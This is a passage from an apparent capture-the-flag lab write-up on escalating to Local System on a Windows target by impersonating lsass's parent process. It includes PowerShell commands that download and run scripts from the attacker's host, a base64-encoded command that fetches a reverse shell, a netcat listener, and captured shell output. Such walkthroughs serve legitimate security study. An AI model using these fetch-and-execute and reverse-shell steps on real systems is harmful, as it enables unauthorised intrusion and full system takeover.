- ***From the Target***🎯 

```bash
IEX (New-Object Net.WebClient).downloadString('http://10.10.15.174/psgetsys.ps1')
```

Next, we must know the *PID* of a procees running under *Local System*, *LSAS* always runs as the latter

```bash
( Get-Process | ? { $_.ProcessName -eq 'lsass' } ).Id
```

> [!NOTE]- *Command Output*
>
> ```bash
> 644
> ```
>

With this *PID*, we can run the following command to get command execution as *Local System*

First, we will send another *ICMP* packet using *ping* to see if it works

- ***From the Attacker***⚔️ 

```bash
tcpdump --interface tun0 -v -n icmp
```

- ***From the Target*** 🎯

```bash
ImpersonateFromParentPid -ppid 644 -command 'C:\Windows\System32\cmd.exe' -cmdargs '/c ping -n 1 10.10.15.174'
```

> [!NOTE]- *TCPdump's Output*
>
> ```bash
> tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
> 
> 19:03:50.047944 IP (tos 0x0, ttl 127, id 65354, offset 0, flags [none], proto ICMP (1), length 60)
>     10.129.230.183 > 10.10.15.174: ICMP echo request, id 1, seq 10, length 40
> 19:03:50.048064 IP (tos 0x0, ttl 64, id 50845, offset 0, flags [none], proto ICMP (1), length 60)
>     10.10.15.174 > 10.129.230.183: ICMP echo reply, id 1, seq 10, length 40
> 
> ```
>

And it is!

So now, we can use the created *reverse shell* called *rev.ps1* to receive another *shell*, but this time as *Local System* 💪🏻

To do so, set up another *HTTP* server from the attacker and another *TCP* listener on the same port as before

```bash
python3 -m http.server 80
```

```bash
rlwrap -CaR nc -nlvp 1234
```

Then run the following command in the target

```bash
ImpersonateFromParentPid -ppid 644 -command 'C:\Windows\System32\cmd.exe' -cmdargs '/c powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4AMQA3ADQALwByAGUAdgAuAHAAcwAxACcAKQA='
```

And we have received the *reverse shell* as *Local System*!

> [!NOTE]- *Netcat's Output*
>
> ```bash
> Connection received on 10.129.230.183 49729
> PS C:\Windows\system32> 
> PS C:\Windows\system32>
> nt authority\system
> PS C:\Windows\system32>
> ```
>

All that remains to grab the content of both flags and move on to the next machine!😊 